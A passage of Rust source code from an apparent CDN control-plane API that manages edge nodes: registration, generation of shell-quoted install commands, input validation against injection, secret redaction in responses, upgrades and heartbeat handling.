//! Edge node management: pre-registration, install commands, lifecycle and
//! heartbeat ingest.

use crate::middleware::agent_auth::AgentAuth;
use crate::middleware::authz::Actor;
use crate::repository;
use crate::service::agent_http;
use crate::state::AppState;
use axum::{
    extract::{Path, Query, State},
    http::{header, HeaderMap, HeaderValue, StatusCode},
    response::{IntoResponse, Response},
    Json,
};
use serde::{Deserialize, Serialize};
use uuid::Uuid;

#[derive(Serialize)]
pub struct NodeDto {
    pub id: String,
    pub name: String,
    pub region: String,
    pub ip: String,
    pub status: String,
    pub last_heartbeat: Option<String>,
    pub agent_url: String,
    pub version: String,
    pub cpu_usage: Option<f64>,
    pub memory_usage: Option<f64>,
    pub active_connections: Option<i64>,
    pub created_at: String,
    pub has_token: bool,
    pub public_ip: String,
    pub isp: String,
    pub country: String,
    pub province: String,
    pub city: String,
    pub weight: i32,
    pub max_bandwidth_mbps: i32,
    /// Opaque JSON text produced by the console's "add edge" wizard. Empty when
    /// the node was registered without one.
    pub edge_profile: String,
}

fn to_dto(r: repository::NodeRow) -> NodeDto {
    NodeDto {
        id: r.id.to_string(),
        name: r.name,
        region: r.region,
        ip: r.ip,
        status: r.status,
        last_heartbeat: r.last_heartbeat.map(|t| t.to_rfc3339()),
        agent_url: r.agent_url,
        version: r.version,
        cpu_usage: r.cpu_usage,
        memory_usage: r.memory_usage,
        active_connections: r.active_connections,
        created_at: r.created_at.to_rfc3339(),
        has_token: !r.auth_token.is_empty(),
        public_ip: r.public_ip,
        isp: r.isp,
        country: if r.country.is_empty() {
            "CN".into()
        } else {
            r.country
        },
        province: r.province,
        city: r.city,
        weight: r.weight,
        max_bandwidth_mbps: r.max_bandwidth_mbps,
        // The profile carries the rendered edge.env (node token + shared
        // secrets). General list/detail responses must not expose it; the
        // node fetches it through the token-authenticated /edge/config route.
        edge_profile: profile_without_env(&r.edge_profile),
    }
}

/// Strip the rendered `edge.env` from a profile before it enters an API DTO.
///
/// Fail closed (`{}`) on malformed JSON rather than returning a blob that might
/// still contain the secret-bearing `env` field.
fn profile_without_env(raw: &str) -> String {
    let Ok(mut value) = serde_json::from_str::<serde_json::Value>(raw) else {
        return "{}".to_string();
    };
    if let Some(object) = value.as_object_mut() {
        object.remove("env");
    }
    value.to_string()
}

#[derive(Serialize)]
pub struct InstallCommands {
    pub binary: String,
    pub docker: String,
}

#[derive(Serialize)]
pub struct CreateNodeResponse {
    pub node: NodeDto,
    /// Only returned once at creation; keep it secret.
    pub token: String,
    pub commands: InstallCommands,
    /// Control-plane base URL the edge must use as `CONTROL_URL`.
    ///
    /// Resolved from `CONTROL_PUBLIC_URL` (or the request Host header) by the
    /// same code that builds the install commands, so both agree. The console
    /// used to guess the browser origin, which is wrong when the API and the
    /// static console are served from different origins.
    pub control_url: String,
    /// False when the control plane has no WAF signing key; every edge will
    /// reject signed rulepacks until it is configured.
    pub waf_rulepack_configured: bool,
}

#[derive(Serialize)]
pub struct NodeDetailResponse {
    pub node: NodeDto,
    pub token: String,
    pub commands: InstallCommands,
    /// See [`CreateNodeResponse::control_url`].
    pub control_url: String,
    /// See [`CreateNodeResponse::waf_rulepack_configured`].
    pub waf_rulepack_configured: bool,
}

#[derive(Deserialize)]
pub struct CreateNodeRequest {
    pub name: String,
    pub region: Option<String>,
    pub ip: Option<String>,
    pub agent_url: Option<String>,
    pub public_ip: Option<String>,
    pub isp: Option<String>,
    pub country: Option<String>,
    pub province: Option<String>,
    pub city: Option<String>,
    pub weight: Option<i32>,
    pub max_bandwidth_mbps: Option<i32>,
    /// Hardware profile from the console wizard (JSON object, opaque here).
    pub edge_profile: Option<String>,
}

#[derive(Deserialize)]
pub struct UpgradeNodeRequest {
    #[serde(default)]
    pub version: Option<String>,
}

#[derive(Serialize)]
pub struct UpgradeNodeResponse {
    pub queued: bool,
    pub version: String,
    pub node: String,
    pub message: String,
}

pub async fn upgrade(
    State(state): State<AppState>,
    actor: Actor,
    Path(id): Path<String>,
    Json(req): Json<UpgradeNodeRequest>,
) -> Result<Json<UpgradeNodeResponse>, (StatusCode, Json<ErrorBody>)> {
    admin(&actor)?;
    let node_id = parse_uuid(&id)?;
    let node = repository::get_node(&state.pool, node_id)
        .await
        .map_err(|_| db_error())?
        .ok_or_else(|| {
            (
                StatusCode::NOT_FOUND,
                Json(ErrorBody {
                    error: "node not found".into(),
                }),
            )
        })?;
    if node.agent_url.trim().is_empty() || node.auth_token.trim().is_empty() {
        return Err((
            StatusCode::BAD_REQUEST,
            Json(ErrorBody {
                error: "node has no agent URL or agent token".into(),
            }),
        ));
    }
    let version = match req.version.as_deref() {
        Some(raw) => crate::api::system::validate_tag(raw).ok_or_else(|| {
            (
                StatusCode::BAD_REQUEST,
                Json(ErrorBody {
                    error: "invalid release version".into(),
                }),
            )
        })?,
        None => crate::api::system::latest_release_tag()
            .await
            .map_err(|e| {
                (
                    StatusCode::BAD_GATEWAY,
                    Json(ErrorBody {
                        error: format!("cannot resolve latest release: {e}"),
                    }),
                )
            })?,
    };

    let url = format!("{}/__lagran/update", node.agent_url.trim_end_matches('/'));
    agent_http::post_json_ok(
        &url,
        &serde_json::json!({ "version": version }),
        &node.auth_token,
    )
    .await
    .map_err(|e| {
        (
            StatusCode::BAD_GATEWAY,
            Json(ErrorBody {
                error: format!("edge rejected upgrade request: {e}"),
            }),
        )
    })?;

    let _ = repository::insert_audit(
        &state.pool,
        &actor.email,
        "node.upgrade",
        &node.name,
        &format!("version={version}"),
    )
    .await;
    Ok(Json(UpgradeNodeResponse {
        queued: true,
        version: version.clone(),
        node: node.name,
        message: format!("node will download {version} and restart after verification"),
    }))
}

#[derive(Deserialize)]
pub struct UpdateNodeRequest {
    pub name: Option<String>,
    pub region: Option<String>,
    pub agent_url: Option<String>,
    pub public_ip: Option<String>,
    pub isp: Option<String>,
    pub country: Option<String>,
    pub province: Option<String>,
    pub city: Option<String>,
    pub weight: Option<i32>,
    pub max_bandwidth_mbps: Option<i32>,
    /// Hardware profile from the console wizard (JSON object, opaque here).
    pub edge_profile: Option<String>,
}

#[derive(Deserialize)]
pub struct StatusRequest {
    pub enabled: bool,
}

#[derive(Deserialize)]
pub struct HeartbeatRequest {
    pub node_id: Option<String>,
    pub region: Option<String>,
    pub ip: Option<String>,
    pub agent_url: Option<String>,
    pub cpu_usage: Option<f64>,
    pub memory_usage: Option<f64>,
    pub active_connections: Option<u64>,
    pub version: Option<String>,
    pub public_ip: Option<String>,
}

#[derive(Serialize)]
pub struct HeartbeatResponse {
    pub accepted: bool,
    pub message: String,
    /// False when an admin disabled the node; the edge stops serving traffic.
    pub enabled: bool,
    pub status: String,
}

#[derive(Serialize)]
pub struct ErrorBody {
    pub error: String,
}

fn admin(actor: &Actor) -> Result<(), (StatusCode, Json<ErrorBody>)> {
    if actor.admin() {
        Ok(())
    } else {
        Err((
            StatusCode::FORBIDDEN,
            Json(ErrorBody {
                error: "admin only".into(),
            }),
        ))
    }
}

fn parse_uuid(id: &str) -> Result<Uuid, (StatusCode, Json<ErrorBody>)> {
    Uuid::parse_str(id).map_err(|_| {
        (
            StatusCode::BAD_REQUEST,
            Json(ErrorBody {
                error: "invalid node id".into(),
            }),
        )
    })
}

fn db_error() -> (StatusCode, Json<ErrorBody>) {
    (
        StatusCode::INTERNAL_SERVER_ERROR,
        Json(ErrorBody {
            error: "database error".into(),
        }),
    )
}

fn new_token() -> String {
    format!("{}{}", Uuid::new_v4().simple(), Uuid::new_v4().simple())
}

/// GeoIP DAT uses uppercase ISO 3166-1 alpha-2 codes (CN/HK/US...).
fn normalize_country(raw: &str) -> String {
    let country = raw.trim().to_ascii_uppercase();
    if country.is_empty() {
        "CN".into()
    } else {
        country
    }
}

/// Public control-plane URL used inside install commands.
///
/// The `Host` and `X-Forwarded-Proto` headers are attacker-controlled on any
/// deployment that sits behind a proxy, and the result is pasted into a shell
/// script that runs as root on the edge. When `CONTROL_PUBLIC_URL` is not set we
/// therefore ignore the headers entirely rather than trusting them, and only
/// accept a syntactically valid http(s) URL as the configured value.
fn public_base(state: &AppState, headers: &HeaderMap) -> String {
    let configured = state.config.public_url.trim().trim_end_matches('/');
    if let Some(base) = safe_public_base(configured) {
        return base;
    }

    // Fallback: host:port only, restricted to characters that can appear in an
    // authority. Anything else is rejected so the value cannot break out of the
    // shell assignment it is placed into.
    let host = headers
        .get("host")
        .and_then(|v| v.to_str().ok())
        .unwrap_or("127.0.0.1:8080");
    let host: String = host
        .trim()
        .chars()
        .filter(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '-' | ':' | '[' | ']'))
        .collect();
    let host = if host.is_empty() {
        "127.0.0.1:8080".to_string()
    } else {
        host
    };
    let proto = match headers
        .get("x-forwarded-proto")
        .and_then(|v| v.to_str().ok())
    {
        Some(p) if p.eq_ignore_ascii_case("https") => "https",
        _ => "http",
    };
    format!("{proto}://{host}")
}

/// Accept only `http(s)://host[:port][/path]` with no whitespace or shell
/// metacharacters. Returns `None` for anything else.
fn safe_public_base(raw: &str) -> Option<String> {
    let trimmed = raw.trim().trim_end_matches('/');
    if trimmed.is_empty() {
        return None;
    }
    let rest = trimmed
        .strip_prefix("https://")
        .or_else(|| trimmed.strip_prefix("http://"))?;
    if rest.is_empty() || !rest.starts_with(|c: char| c.is_ascii_alphanumeric()) {
        return None;
    }
    if rest.chars().any(|c| {
        c.is_whitespace()
            || c.is_control()
            || matches!(
                c,
                '"' | '\''
                    | '`'
                    | ';'
                    | '&'
                    | '|'
                    | '$'
                    | '('
                    | ')'
                    | '<'
                    | '>'
                    | '*'
                    | '?'
                    | '!'
                    | '{'
                    | '}'
            )
    }) {
        return None;
    }
    Some(trimmed.to_string())
}

/// Quote a value for safe interpolation into a POSIX shell script.
///
/// `region`, `agent_url` and the node name all originate from an API request and
/// end up in commands an operator copies and runs as root on an edge host. Single
/// quotes make the whole value literal; embedded single quotes are closed,
/// escaped and reopened ('\'').
fn shell_quote(value: &str) -> String {
    let mut out = String::with_capacity(value.len() + 2);
    out.push('\'');
    for ch in value.chars() {
        if ch == '\'' {
            out.push_str("'\\''");
        } else {
            out.push(ch);
        }
    }
    out.push('\'');
    out
}

/// The profile also carries the rendered `edge.env` so a node token can fetch
/// its configuration; the old 8 KiB bound is too small for that file.
const MAX_EDGE_PROFILE_BYTES: usize = 128 * 1024;

/// Extract the rendered `edge.env` from the opaque profile JSON.
fn edge_env_from_profile(raw: &str) -> Option<String> {
    let value: serde_json::Value = serde_json::from_str(raw).ok()?;
    value
        .get("env")
        .and_then(|env| env.as_str())
        .filter(|env| !env.trim().is_empty())
        .map(ToOwned::to_owned)
}

/// Values pasted verbatim into `export X=...` or `docker run -e X=...`.
///
/// Region names are operator labels; anything outside this set is almost
/// certainly a mistake or an injection attempt and is rejected up front instead
/// of being quoted and stored.
/// The console owns the profile shape; the control plane only enforces that it
/// is a bounded JSON object, so a malformed blob cannot break the drawer.
fn validate_edge_profile(raw: &str) -> Result<String, String> {
    let trimmed = raw.trim();
    if trimmed.is_empty() {
        return Ok(String::new());
    }
    if trimmed.len() > MAX_EDGE_PROFILE_BYTES {
        return Err("edge_profile is too large".into());
    }
    let value: serde_json::Value =
        serde_json::from_str(trimmed).map_err(|_| "edge_profile must be valid JSON".to_string())?;
    if !value.is_object() {
        return Err("edge_profile must be a JSON object".into());
    }
    Ok(value.to_string())
}

fn validate_region(region: &str) -> Result<String, String> {
    let region = region.trim();
    if region.is_empty() {
        return Ok("default".into());
    }
    if region.len() > 64 {
        return Err("region must be at most 64 characters".into());
    }
    if !region
        .chars()
        .all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.'))
    {
        return Err("region may only contain letters, digits, '-', '_' and '.'".into());
    }
    Ok(region.to_string())
}

/// The edge agent URL must be a plain http(s) origin.
fn validate_agent_url(agent_url: &str) -> Result<String, String> {
    let trimmed = agent_url.trim();
    if trimmed.is_empty() {
        return Ok(String::new());
    }
    if trimmed.len() > 256 {
        return Err("agent_url is too long".into());
    }
    let rest = trimmed
        .strip_prefix("https://")
        .or_else(|| trimmed.strip_prefix("http://"))
        .ok_or_else(|| "agent_url must start with http:// or https://".to_string())?;
    if rest.is_empty() || !rest.starts_with(|c: char| c.is_ascii_alphanumeric()) {
        return Err("agent_url must contain a host".into());
    }
    if rest.chars().any(|c| {
        c.is_whitespace()
            || c.is_control()
            || matches!(
                c,
                '"' | '\'' | '`' | ';' | '&' | '|' | '$' | '(' | ')' | '<' | '>'
            )
    }) {
        return Err("agent_url contains characters that are not allowed".into());
    }
    Ok(trimmed.trim_end_matches('/').to_string())
}

/// Pick a management bind address that the control plane can actually reach.
///
/// `AGENT_URL` is what the control plane calls; `EDGE_ADMIN_LISTEN` is what the
/// edge binds. They used to be hardcoded independently (public callback URL,
/// loopback listener), so purge/cert/ACME failed while heartbeats still looked
/// healthy.
///
/// The edge parses the listener as a `SocketAddr`, so an `AGENT_URL` hostname
/// cannot be bound directly. In that case keep the safe loopback default and
/// let the operator override it; an IP literal is bound exactly.
fn admin_listen_for(agent_url: &str) -> String {
    let trimmed = agent_url.trim();
    let rest = trimmed
        .strip_prefix("https://")
        .or_else(|| trimmed.strip_prefix("http://"));
    let Some(rest) = rest else {
        return "127.0.0.1:8081".into();
    };
    let authority = rest.split('/').next().unwrap_or("");
    let (host, port) = if let Some(after_bracket) = authority.strip_prefix('[') {
        match after_bracket.split_once(']') {
            Some((host, rest)) => (host, rest.strip_prefix(':').unwrap_or("8081")),
            None => return "127.0.0.1:8081".into(),
        }
    } else if let Some((host, port)) = authority.rsplit_once(':') {
        (host, port)
    } else {
        (authority, "8081")
    };
    let port: u16 = port.parse().unwrap_or(8081);
    match host.parse::<std::net::IpAddr>() {
        Ok(ip) => std::net::SocketAddr::new(ip, port).to_string(),
        // Hostnames are legal in AGENT_URL but not in EDGE_ADMIN_LISTEN, which
        // the edge parses as a SocketAddr. Loopback is the safe fallback.
        Err(_) => format!("127.0.0.1:{port}"),
    }
}

fn install_commands(
    base: &str,
    name: &str,
    region: &str,
    public_ip: &str,
    agent_url: &str,
    token: &str,
) -> InstallCommands {
    let agent_url = if agent_url.trim().is_empty() {
        "http://<节点公网IP>:8081".to_string()
    } else {
        agent_url.trim_end_matches('/').to_string()
    };
    let region = if region.is_empty() { "default" } else { region };
    // Substituting the placeholder first means the public IP also drives the
    // management bind for callers that did not pass an agent URL.
    let effective_agent_url = agent_url.replace("<节点公网IP>", public_ip);
    let admin_listen = admin_listen_for(&effective_agent_url);

    // Every value interpolated below comes from an API request and the output is
    // a script an operator pastes into a root shell on the edge host, so each one
    // is single-quoted. The previous code interpolated raw values with `format!`,
    // which turned a crafted `region` into arbitrary root command execution.
    let base_q = shell_quote(base);
    let name_q = shell_quote(name);
    let region_q = shell_quote(region);
    let ip_q = shell_quote(public_ip);
    let agent_q = shell_quote(&agent_url);
    let admin_q = shell_quote(&admin_listen);
    let token_q = shell_quote(token);
    // The default `<节点公网IP>` placeholder is not a shell value; substitute
    // the real public IP when the caller did not supply an agent URL.
    let agent_q = agent_q.replace("<节点公网IP>", &public_ip.replace('\'', ""));

    let binary = format!(
        r#"# 在边缘服务器上执行（当前目录包含 lagran-edge 二进制）
export CONTROL_URL={base_q}
export NODE_ID={name_q}
export NODE_REGION={region_q}
export PUBLIC_IP={ip_q}
export AGENT_URL={agent_q}
export AGENT_TOKEN={token_q}
export EDGE_LISTEN=0.0.0.0:80
# 管理面跟随 AGENT_URL 绑定：purge / certs / update 等接口只允许控制面来源访问。
export EDGE_ADMIN_LISTEN={admin_q}
export CACHE_BACKEND=memory

./lagran-edge"#
    );

    let docker = format!(
        r#"docker run -d --name lagran-edge-{name_q} --restart=always \
  -p 80:80 \
  -e CONTROL_URL={base_q} \
  -e NODE_ID={name_q} \
  -e NODE_REGION={region_q} \
  -e PUBLIC_IP={ip_q} \
  -e AGENT_URL={agent_q} \
  -e AGENT_TOKEN={token_q} \
  -e EDGE_LISTEN=0.0.0.0:80 \
  -e EDGE_ADMIN_LISTEN=127.0.0.1:8081 \
  -e CACHE_BACKEND=memory \
  -v /var/lib/lagran/cache:/data/cache \
  -e DISK_CACHE_DIR=/data/cache \
  lagran-edge:latest"#
    );

    InstallCommands { binary, docker }
}

/// Node inventory (including agent URLs) is infrastructure data: admin only.
pub async fn list(
    State(state): State<AppState>,
    actor: Actor,
) -> Result<Json<Vec<NodeDto>>, (StatusCode, Json<ErrorBody>)> {
    admin(&actor)?;
    let rows = repository::list_nodes(&state.pool).await.map_err(|e| {
        tracing::error!(error = %e, "list nodes");
        db_error()
    })?;
    Ok(Json(rows.into_iter().map(to_dto).collect()))
}

/// Sanitized node view for every authenticated console user.
///
/// The dashboard and monitor wall need node names, regions, status and load for
/// every logged-in user. The admin inventory above also carries `agent_url`,
/// `auth_token` and the rendered edge profile, so it must not be opened up.
/// This DTO deliberately omits every secret and the node's network addresses.
#[derive(Serialize)]
pub struct NodeSummaryDto {
    pub id: String,
    pub name: String,
    pub region: String,
    pub country: String,
    pub province: String,
    pub city: String,
    pub status: String,
    pub cpu_usage: Option<f64>,
    pub memory_usage: Option<f64>,
    pub active_connections: Option<i64>,
    pub last_heartbeat: Option<String>,
}

fn to_summary_dto(r: repository::NodeRow) -> NodeSummaryDto {
    NodeSummaryDto {
        id: r.id.to_string(),
        name: r.name,
        region: r.region,
        country: if r.country.is_empty() {
            "CN".into()
        } else {
            r.country
        },
        province: r.province,
        city: r.city,
        status: r.status,
        cpu_usage: r.cpu_usage,
        memory_usage: r.memory_usage,
        active_connections: r.active_connections,
        last_heartbeat: r.last_heartbeat.map(|t| t.to_rfc3339()),
    }
}

/// Authenticated, non-admin node summary used by the dashboard/monitor wall.
pub async fn public_summary(
    State(state): State<AppState>,
    _actor: Actor,
) -> Result<Json<Vec<NodeSummaryDto>>, (StatusCode, Json<ErrorBody>)> {
    let rows = repository::list_nodes(&state.pool).await.map_err(|e| {
        tracing::error!(error = %e, "list node summary");
        db_error()
    })?;
    Ok(Json(rows.into_iter().map(to_summary_dto).collect()))
}

pub async fn create(
    State(state): State<AppState>,
    actor: Actor,
    headers: HeaderMap,
    Json(req): Json<CreateNodeRequest>,
) -> Result<(StatusCode, Json<CreateNodeResponse>), (StatusCode, Json<ErrorBody>)> {
    admin(&actor)?;
    let name = req.name.trim();
    if name.is_empty() || name.len() > 64 {
        return Err((
            StatusCode::BAD_REQUEST,
            Json(ErrorBody {
                error: "name must be 1-64 characters".into(),
            }),
        ));
    }
    if repository::get_node_by_name(&state.pool, name)
        .await
        .map_err(|_| db_error())?
        .is_some()
    {
        return Err((
            StatusCode::CONFLICT,
            Json(ErrorBody {
                error: "节点名称已存在，请更换名称".into(),
            }),
        ));
    }

    let token = new_token();
    // Both values are interpolated into the install commands: validate them
    // instead of quoting a value that was never meant to be legal.
    let region = validate_region(req.region.as_deref().unwrap_or(""))
        .map_err(|e| (StatusCode::BAD_REQUEST, Json(ErrorBody { error: e })))?;
    let agent_url = validate_agent_url(req.agent_url.as_deref().unwrap_or(""))
        .map_err(|e| (StatusCode::BAD_REQUEST, Json(ErrorBody { error: e })))?;
    // Validated before the row is created: a malformed profile must not leave a
    // half-configured node behind.
    let edge_profile = match req.edge_profile.as_deref() {
        Some(raw) => validate_edge_profile(raw)
            .map_err(|e| (StatusCode::BAD_REQUEST, Json(ErrorBody { error: e })))?,
        None => String::new(),
    };
    let base = public_base(&state, &headers);

    let row = repository::create_node(
        &state.pool,
        name,
        &region,
        req.ip.as_deref().unwrap_or(""),
        &agent_url,
        &token,
    )
    .await
    .map_err(|e| {
        // The pre-check above cannot stop two concurrent requests: the unique
        // index does. Report that race as a conflict rather than a 500.
        if let sqlx::Error::Database(db) = &e {
            if db.constraint() == Some("idx_edge_nodes_name") {
                return (
                    StatusCode::CONFLICT,
                    Json(ErrorBody {
                        error: "节点名称已存在，请更换名称".into(),
                    }),
                );
            }
        }
        tracing::error!(error = %e, "create node");
        db_error()
    })?;

    let country = normalize_country(req.country.as_deref().unwrap_or("CN"));
    let mut row = repository::update_node_meta(
        &state.pool,
        row.id,
        req.public_ip.as_deref().unwrap_or(""),
        req.isp.as_deref().unwrap_or(""),
        &country,
        req.province.as_deref().unwrap_or(""),
        req.city.as_deref().unwrap_or(""),
        req.weight.unwrap_or(100).clamp(0, 1000),
        req.max_bandwidth_mbps.unwrap_or(0).max(0),
    )
    .await
    .map_err(|_| db_error())?
    .unwrap_or(row);

    if !edge_profile.is_empty() {
        repository::update_node_edge_profile(&state.pool, row.id, &edge_profile)
            .await
            .map_err(|_| db_error())?;
        // Keep the response consistent with what was stored, without a re-read.
        row.edge_profile = edge_profile;
    }

    let _ = repository::insert_audit(
        &state.pool,
        &actor.email,
        "node.create",
        name,
        &format!("region={region} agent_url={agent_url}"),
    )
    .await;
    // A new node must be schedulable immediately, not after the snapshot TTL.
    state.nodes.invalidate().await;

    let commands = install_commands(&base, name, &region, &row.public_ip, &agent_url, &token);
    Ok((
        StatusCode::CREATED,
        Json(CreateNodeResponse {
            node: to_dto(row),
            token,
            commands,
            control_url: base,
            waf_rulepack_configured: !state.config.waf_rulepack_secret.trim().is_empty(),
        }),
    ))
}

#[derive(Deserialize)]
pub struct EdgeConfigQuery {
    /// `NODE_ID`; optional because the agent token already identifies the node.
    pub edge: Option<String>,
}

/// `GET /api/v1/edge/config?edge=<NODE_ID>` — the node's rendered `edge.env`.
///
/// The caller must present the node's own `X-Lagran-Agent-Token`. The token is
/// bound to a node name, so one edge cannot fetch another node's file. The
/// response contains the node token and shared WAF/challenge secrets, so it is
/// marked `no-store` and should only travel over the control plane channel.
pub async fn edge_config(
    State(state): State<AppState>,
    agent: AgentAuth,
    Query(query): Query<EdgeConfigQuery>,
) -> Result<Response, (StatusCode, Json<ErrorBody>)> {
    let requested = query.edge.as_deref().unwrap_or("").trim();
    if !requested.is_empty() && requested != agent.node_name {
        return Err((
            StatusCode::FORBIDDEN,
            Json(ErrorBody {
                error: "edge does not match the agent token".into(),
            }),
        ));
    }

    let row = repository::get_node_by_name(&state.pool, &agent.node_name)
        .await
        .map_err(|_| db_error())?
        .ok_or_else(|| {
            (
                StatusCode::NOT_FOUND,
                Json(ErrorBody {
                    error: "node not found".into(),
                }),
            )
        })?;

    let Some(env) = edge_env_from_profile(&row.edge_profile) else {
        return Err((
            StatusCode::CONFLICT,
            Json(ErrorBody {
                error: "no generated edge.env for this node; save it again from the console wizard"
                    .into(),
            }),
        ));
    };

    let mut response = env.into_response();
    response.headers_mut().insert(
        header::CONTENT_TYPE,
        HeaderValue::from_static("text/plain; charset=utf-8"),
    );
    response
        .headers_mut()
        .insert(header::CACHE_CONTROL, HeaderValue::from_static("no-store"));
    Ok(response)
}

pub async fn detail(
    State(state): State<AppState>,
    actor: Actor,
    headers: HeaderMap,
    Path(id): Path<String>,
) -> Result<Json<NodeDetailResponse>, (StatusCode, Json<ErrorBody>)> {
    admin(&actor)?;
    let node_id = parse_uuid(&id)?;
    let row = repository::get_node(&state.pool, node_id)
        .await
        .map_err(|_| db_error())?
        .ok_or_else(|| {
            (
                StatusCode::NOT_FOUND,
                Json(ErrorBody {
                    error: "node not found".into(),
                }),
            )
        })?;
    let base = public_base(&state, &headers);
    let commands = install_commands(
        &base,
        &row.name,
        &row.region,
        &row.public_ip,
        &row.agent_url,
        &row.auth_token,
    );
    Ok(Json(NodeDetailResponse {
        token: row.auth_token.clone(),
        commands,
        control_url: base,
        waf_rulepack_configured: !state.config.waf_rulepack_secret.trim().is_empty(),
        node: to_dto(row),
    }))
}

pub async fn update(
    State(state): State<AppState>,
    actor: Actor,
    Path(id): Path<String>,
    Json(req): Json<UpdateNodeRequest>,
) -> Result<Json<NodeDto>, (StatusCode, Json<ErrorBody>)> {
    admin(&actor)?;
    let node_id = parse_uuid(&id)?;
    let current = repository::get_node(&state.pool, node_id)
        .await
        .map_err(|_| db_error())?
        .ok_or_else(|| {
            (
                StatusCode::NOT_FOUND,
                Json(ErrorBody {
                    error: "node not found".into(),
                }),
            )
        })?;

    let name = req
        .name
        .as_deref()
        .unwrap_or(&current.name)
        .trim()
        .to_string();
    if name.is_empty() || name.len() > 64 {
        return Err((
            StatusCode::BAD_REQUEST,
            Json(ErrorBody {
                error: "name must be 1-64 characters".into(),
            }),
        ));
    }
    if name != current.name {
        if let Some(other) = repository::get_node_by_name(&state.pool, &name)
            .await
            .map_err(|_| db_error())?
        {
            if other.id != node_id {
                return Err((
                    StatusCode::CONFLICT,
                    Json(ErrorBody {
                        error: "节点名称已存在，请更换名称".into(),
                    }),
                ));
            }
        }
    }
    // Create validates both values; update used to store them unchecked. A bad
    // region breaks scheduling and a malformed agent URL leaves purge/cert
    // callbacks pointing at nothing.
    let region = validate_region(req.region.as_deref().unwrap_or(&current.region))
        .map_err(|e| (StatusCode::BAD_REQUEST, Json(ErrorBody { error: e })))?;
    let agent_url = validate_agent_url(req.agent_url.as_deref().unwrap_or(&current.agent_url))
        .map_err(|e| (StatusCode::BAD_REQUEST, Json(ErrorBody { error: e })))?;
    // Reject a malformed profile before touching any column.
    let edge_profile = match req.edge_profile.as_deref() {
        Some(raw) => validate_edge_profile(raw)
            .map_err(|e| (StatusCode::BAD_REQUEST, Json(ErrorBody { error: e })))?,
        None => String::new(),
    };

    let row = repository::update_node(&state.pool, node_id, &name, &region, &agent_url)
        .await
        .map_err(|e| {
            tracing::error!(error = %e, "update node");
            db_error()
        })?
        .ok_or_else(|| {
            (
                StatusCode::NOT_FOUND,
                Json(ErrorBody {
                    error: "node not found".into(),
                }),
            )
        })?;

    let country = normalize_country(req.country.as_deref().unwrap_or(&current.country));
    let _ = repository::update_node_meta(
        &state.pool,
        node_id,
        req.public_ip.as_deref().unwrap_or(&current.public_ip),
        req.isp.as_deref().unwrap_or(&current.isp),
        &country,
        req.province.as_deref().unwrap_or(&current.province),
        req.city.as_deref().unwrap_or(&current.city),
        req.weight.unwrap_or(current.weight).clamp(0, 1000),
        req.max_bandwidth_mbps
            .unwrap_or(current.max_bandwidth_mbps)
            .max(0),
    )
    .await;
    if !edge_profile.is_empty() {
        // The re-read below refreshes `row`, so the response carries the profile.
        let _ = repository::update_node_edge_profile(&state.pool, node_id, &edge_profile).await;
    }
    let row = repository::get_node(&state.pool, node_id)
        .await
        .ok()
        .flatten()
        .unwrap_or(row);

    let _ = repository::insert_audit(
        &state.pool,
        &actor.email,
        "node.update",
        &row.name,
        &format!(
            "region={} agent_url={} province={} isp={}",
            row.region, row.agent_url, row.province, row.isp
        ),
    )
    .await;
    state.nodes.invalidate().await;
    // A rename changes the node name the token resolves to. Drop the cached
    // mapping immediately on this process; other replicas expire it by TTL.
    state
        .agent_tokens
        .invalidate(state.redis.as_deref(), &current.auth_token)
        .await;
    Ok(Json(to_dto(row)))
}

pub async fn set_status(
    State(state): State<AppState>,
    actor: Actor,
    Path(id): Path<String>,
    Json(req): Json<StatusRequest>,
) -> Result<Json<NodeDto>, (StatusCode, Json<ErrorBody>)> {
    admin(&actor)?;
    let node_id = parse_uuid(&id)?;
    let status = if req.enabled { "offline" } else { "disabled" };
    let row = repository::set_node_status(&state.pool, node_id, status)
        .await
        .map_err(|_| db_error())?
        .ok_or_else(|| {
            (
                StatusCode::NOT_FOUND,
                Json(ErrorBody {
                    error: "node not found".into(),
                }),
            )
        })?;

    let _ = repository::insert_audit(
        &state.pool,
        &actor.email,
        if req.enabled {
            "node.enable"
        } else {
            "node.disable"
        },
        &row.name,
        "",
    )
    .await;
    // Stop (or resume) scheduling this node immediately.
    state.nodes.invalidate().await;
    // Disabling a node must invalidate its token, not merely its scheduling
    // snapshot; otherwise cached auth would keep accepting heartbeats.
    state
        .agent_tokens
        .invalidate(state.redis.as_deref(), &row.auth_token)
        .await;
    Ok(Json(to_dto(row)))
}

pub async fn delete(
    State(state): State<AppState>,
    actor: Actor,
    Path(id): Path<String>,
) -> Result<Json<serde_json::Value>, (StatusCode, Json<ErrorBody>)> {
    admin(&actor)?;
    let node_id = parse_uuid(&id)?;
    let row = repository::get_node(&state.pool, node_id)
        .await
        .map_err(|_| db_error())?
        .ok_or_else(|| {
            (
                StatusCode::NOT_FOUND,
                Json(ErrorBody {
                    error: "node not found".into(),
                }),
            )
        })?;
    repository::delete_node(&state.pool, node_id)
        .await
        .map_err(|_| db_error())?;
    let _ = repository::insert_audit(&state.pool, &actor.email, "node.delete", &row.name, "").await;
    state.nodes.invalidate().await;
    state
        .agent_tokens
        .invalidate(state.redis.as_deref(), &row.auth_token)
        .await;
    Ok(Json(serde_json::json!({ "success": true, "id": id })))
}

pub async fn heartbeat(
    State(state): State<AppState>,
    agent: AgentAuth,
    Json(req): Json<HeartbeatRequest>,
) -> Result<Json<HeartbeatResponse>, (StatusCode, Json<serde_json::Value>)> {
    let node_id = req
        .node_id
        .clone()
        .filter(|s| !s.is_empty())
        .unwrap_or_else(|| "edge-unknown".into());
    if node_id != agent.node_name {
        return Err(node_mismatch());
    }
    Ok(apply_heartbeat(&state, &node_id, &req).await)
}

pub async fn heartbeat_by_path(
    State(state): State<AppState>,
    agent: AgentAuth,
    Path(id): Path<String>,
    Json(req): Json<HeartbeatRequest>,
) -> Result<Json<HeartbeatResponse>, (StatusCode, Json<serde_json::Value>)> {
    if id != agent.node_name {
        return Err(node_mismatch());
    }
    Ok(apply_heartbeat(&state, &id, &req).await)
}

fn node_mismatch() -> (StatusCode, Json<serde_json::Value>) {
    (
        StatusCode::FORBIDDEN,
        Json(serde_json::json!({
            "error": "node_id does not match the agent token"
        })),
    )
}

async fn apply_heartbeat(
    state: &AppState,
    node_id: &str,
    req: &HeartbeatRequest,
) -> Json<HeartbeatResponse> {
    let region = req.region.clone().unwrap_or_default();
    let ip = req.ip.clone().unwrap_or_default();
